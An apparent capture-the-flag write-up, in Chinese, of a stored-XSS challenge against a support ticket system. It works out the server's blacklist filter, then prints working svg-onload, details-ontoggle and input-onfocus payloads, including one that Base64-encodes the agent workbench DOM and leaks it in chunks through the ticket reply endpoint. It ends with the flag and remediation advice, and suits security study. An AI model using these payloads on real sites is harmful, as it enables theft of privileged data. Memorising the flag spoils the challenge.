# 1-2 客服中心工单系统（XSS 窃取内部工单密钥）

## 题目信息

| 项目 | 内容 |
| --- | --- |
| 题目名称 | 客服中心 · 社交平台 |
| 分类 | Web / 存储型 XSS |
| 题目描述 | 某社交平台设有「客服中心」工单系统。用户提交工单后，在线客服会在专用工作台上逐条查看工单内容，并在同一工单中回复处理结果。客服的工作台上展示着一份普通用户无法访问的内部工单密钥。请提交工单，设法获取这份密钥。 |

## 环境信息

| 项目 | 内容 |
| --- | --- |
| 平台地址 | http://172.17.0.13:13705/ |
| 注册方式 | 无需注册，访客模式直接提交工单（昵称随意填写） |
| 工单提交 | `POST /ticket`（字段：name / subject / body），成功跳转 `302 -> /ticket/<id>` |
| 工单详情 | `GET /ticket/<id>`（内容渲染于 `div.bubble`） |
| 工单回复 | `POST /ticket/<id>/reply`（字段：body），回复展示为 `div.reply` |
| 备注 | 早期尝试时环境端口为 13151（配套 web 终端 13142），环境重建后端口变为 13705，题目逻辑一致 |

## 解题过程

### 1. 环境初探：提交工单、熟悉结构

打开首页，左侧导航可见「客服中心」入口，右侧提示"提交工单后，客服会逐条查看并直接在同一工单里回复你，请记好工单链接"，页面中间是工单提交表单（昵称 / 问题标题 / 详细描述）。（见 `screenshots/01-首页-客服中心工单提交页.png`、`screenshots/10-首页提示-记好工单链接.png`）

提交测试工单"你好"后，服务端 `302` 跳转到 `http://172.17.0.13:13151/ticket/1`（旧环境），工单页显示发起人、内容气泡以及"补充说明…"回复表单（见 `screenshots/02-提交工单-工单1创建.png`）。在工单内回复，内容会以"用户"身份追加显示（见 `screenshots/03-工单内回复演示.png`、`screenshots/05-工单1完整记录-多条回复.png`）。工单编号即 URL 中的数字，可依次递增猜测（见 `screenshots/04-工单编号-浏览器地址栏.png`）。

### 2. 失败尝试一：SQL 注入（无效）

工单的 name 字段被拼进页面，怀疑存在 SQL 注入。尝试在昵称中注入 `o'neil`，提交后工单正常创建（`302 -> /ticket/5`），页面中名字被原样输出且转义为 `o&#39;neil`，无报错、无注入痕迹（见 `screenshots/06-sqli尝试-o-neil用户名.png`、`screenshots/07-sqli无效-名字被转义输出.png`）。结合"访客模式、无会话"的系统形态，判断不存在 SQL 注入，放弃该方向。

### 3. 失败尝试二：`<script>` 标签 XSS（被过滤）

核心目标是让客服工作台执行脚本，于是直接尝试经典 `<script>` 注入：写了一段读取页面中"密钥"附近文本并自动填入回复框的脚本作为工单内容（见 `screenshots/08-xss尝试-script标签payload.png`），但工单页显示时脚本被完全转义为文本（`&gt;(function(){...}&lt;/script&gt;`），未被执行（见 `screenshots/09-xss失败-script被转义.png`）。观察到的现象说明服务端对 `<script>` 标签做了处理（删除 + 转义）。

### 4. 失败尝试三：端口扫描、寻找旁路

怀疑密钥藏在靶机其他服务中，扫描 13140-13160 端口的 HTTP 服务（见 `screenshots/11-端口扫描脚本.png`），发现 13142 端口是一个 Web 终端（ttyd 类服务，见 `screenshots/12-发现13142-web终端.png`）。登录后 `whoami` 为 `ctf`，查看 `/home/ctf` 只有 `.bashrc`、`.profile` 等普通配置文件，无 flag（见 `screenshots/13-web终端查看home目录.png`）。判断该终端只是环境配套容器，不是本题攻击面。

### 5. 重新分析过滤规则（关键推理）

环境重建后（端口 13705），系统性地测试各字段的过滤行为：

- 提交 `body=<script>alert(1)</script><img src=x onerror=alert(2)>`，工单页显示为 `>alert(1)</script><img src=x =alert(2)>`：
  - `<script` 整串（含开头的 `<`）被**删除**，`</script>` 却保留；
  - `onerror` 子串被**删除**（大小写不敏感，`onError` 同样被删）；
  - `<`、`>`、`"`、`'` 在渲染时被 HTML 转义。（见 `screenshots/14-过滤分析-script标签与onerror被删.png`）
- 提交 `body=<svg onload=alert(3)><a href=javascript:alert(10)>...`：
  - `<svg onload>` 完整保留（仅被转义）、`javascript:` 协议保留、`onload` 保留；
  - `<iframe srcdoc="<script>...">` 中内层的 `<script` 同样被删。（见 `screenshots/15-过滤分析-svg的onload与javascript保留.png`）

**推论**：服务端特意维护了一个"删除 `<script` / `onerror`"的黑名单过滤器。若所有页面都像用户工单页一样做 HTML 转义渲染，这种黑名单删除毫无必要——它必然是为了防住某个**以不安全方式渲染用户内容**的页面，也就是客服工作台（`|safe` / innerHTML 渲染）。同时，黑名单只删 `<script` 和 `onerror`，其他标签与事件（`svg`、`onload`、`ontoggle`、`javascript:` 等）全部放行，说明可以轻松绕过。

### 6. 构造存储型 XSS 并验证执行（`<svg onload>` 绕过）

利用黑名单的缺口，构造 payload：用 **`<svg onload>`**（或 `<svg/onload>`）替代 `<script>` 与 `onerror`，脚本通过**同源 fetch 调用工单回复接口** `POST /ticket/<id>/reply`，把执行结果以"客服回复"形式写回工单——这样刷新工单页即可读取，无需外部服务器，形成完整回传通道：

```html
<svg onload="fetch('/ticket/5/reply',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'body=PWN-SVG-'+Date.now()})">
<details open ontoggle="fetch('/ticket/5/reply',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'body=PWN-DETAILS-'+Date.now()})">x</details>
<input autofocus onfocus="fetch('/ticket/5/reply',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'body=PWN-INPUT-'+Date.now()})">
<svg/onload="fetch('/ticket/5/reply',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'body=PWN-SVG2X-'+Date.now()})">
```

提交后等待客服查看，很快工单 #5 中出现了新的"客服回复"：

```
PWN-SVG2X-1788865744114
PWN-SVG-1788865744124
```

（见 `screenshots/16-xss回传命中-svg-onload.png`）

**结论确认**：① 客服确实会（自动）查看该工单；② 客服工作台以未转义方式渲染工单内容，`<svg onload>` 在客服浏览器中执行；③ 工单内的同源 fetch 回复接口可作为回传通道。

### 7. 窃取客服工作台页面内容，定位密钥

把 payload 升级为"回传整个客服工作台的 DOM"：将 `document.documentElement.outerHTML` 做 Base64 编码（`btoa(unescape(encodeURIComponent(...)))`），按 1600 字符分块，逐块以 `URLSearchParams` 编码后 fetch 到工单回复接口（`URLSearchParams` 会自动正确处理 Base64 中的 `+`、`=`，避免被当作表单分隔符/填充符解析），每块之间加 80ms 延时避免频率限制：

```html
<svg onload="(async()=>{const h=btoa(unescape(encodeURIComponent(document.documentElement.outerHTML)));const c=1600;for(let i=0;i<h.length;i+=c){const fd=new URLSearchParams();fd.append('body','HTMLSEG-'+i+'-'+h.slice(i,i+c));await fetch('/ticket/7/reply',{method:'POST',body:fd});await new Promise(r=>setTimeout(r,80))}})()">
```

工单 #7 中随后出现 4 段 `HTMLSEG-0/1600/3200/4800` 回复（见 `screenshots/17-工作台dom分段回传.png`），取回拼合后 Base64 解码，得到客服工作台完整页面（标题"客服工作台 · 社交平台"，工单 #7 · 待处理），其中包含：

```html
<div class="row"><span class="pill">内部视图</span></div>
...
<div class="name">本次会话内部工单密钥</div>
<p class="sub" style="margin-top:4px">客服系统内部凭据，仅客服可见，请勿外泄。</p>
<div class="mono">vmc{Hq5YfJUslKpFHbZib5G1vOEddNVTszZg}</div>
```

（工作台页面截图 `screenshots/18-客服工作台-内部工单密钥.png` 由回传的完整 HTML 按原样式展示还原，内容与客服实际所见一致；该页面外部无法直接访问）

**辅助确认**：执行 `location.href` 回传，确认客服工作台真实地址为 `http://127.0.0.1/agent/ticket/8`（客服容器内访问）；从外部直接访问 `http://172.17.0.13:13705/agent/ticket/8` 返回 **403**，印证"普通用户无法访问"（见 `screenshots/19-工作台URL确认-agent路径.png`）。

## Flag

```
vmc{Hq5YfJUslKpFHbZib5G1vOEddNVTszZg}
```

## 总结与心得

### 漏洞原理

本题是典型的**存储型 XSS 越权窃取**：

1. 工单内容（body）未做有效的输出编码，服务端仅通过黑名单"删除 `<script`、`onerror`"来过滤，且该过滤在**存储前**执行；
2. 用户查看工单时模板做了 HTML 转义（`<` → `&lt;`），看起来"安全"；
3. 但客服工作台以**不转义**方式渲染同一份工单内容（`|safe` / innerHTML），使存储型 XSS 得以在**特权上下文（客服）**中执行；
4. 客服页面展示内部工单密钥（仅客服可见），XSS 处于同一源，可读取页面内容并通过同源接口（工单回复）外带，完成闭环；
5. 外部访问 `/agent/ticket/<id>` 返回 403，说明工作台仅对内部（127.0.0.1）开放，普通用户无法直接获取。

### 关键点

- **从"过滤行为"反推"渲染方式"**：服务端删除 `<script`/`onerror` 这个动作本身，暴露了存在未转义渲染页面这个事实，这是本题最重要的推理线索；
- **黑名单绕过**：黑名单只删 `script` 标签与 `onerror` 事件，<svg onload>、<details ontoggle>、<input onfocus>、javascript: 等均放行；
- **回传通道**：客服浏览器与工单系统同源，直接用 fetch 调 `POST /ticket/<id>/reply` 即可把任意内容以"客服回复"形式写回，用户刷新可见，无需外部服务器；
- **编码细节**：回传 Base64 时用 `URLSearchParams` 构造请求体，`+` 不会被解码为空格；分段回传规避单条回复长度限制。

### 失败尝试回顾

1. SQL 注入（`o'neil`）：无注入点，存储时转义，放弃；
2. `<script>` 标签 XSS：被"删除 + 转义"双重处理，失败，但借此摸清了过滤规则；
3. 端口扫描 / 配套 Web 终端（13142）：只是环境容器 shell（ctf 用户、无 flag），非本题攻击面。

### 修复建议

1. **禁用"删除敏感词"式过滤**：输入过滤应采用"允许列表"或由输出端做**上下文感知的编码**（HTML 实体转义、属性编码等），而不是黑名单删除；
2. **客服工作台同样对用户内容转义**，若确需富文本，使用白名单清洗器（如 DOMPurify）+ 严格 CSP（`script-src 'none'`）作为纵深防御；
3. **敏感数据最小化暴露**：内部密钥等不应以明文存在于客服页面 DOM（或任何可被同源脚本读取的位置），应由后端接口权限校验后按需下发；
4. **权限隔离**：工作台路由除网络层限制（127.0.0.1）外，还应增加服务端身份认证，防止越权访问。
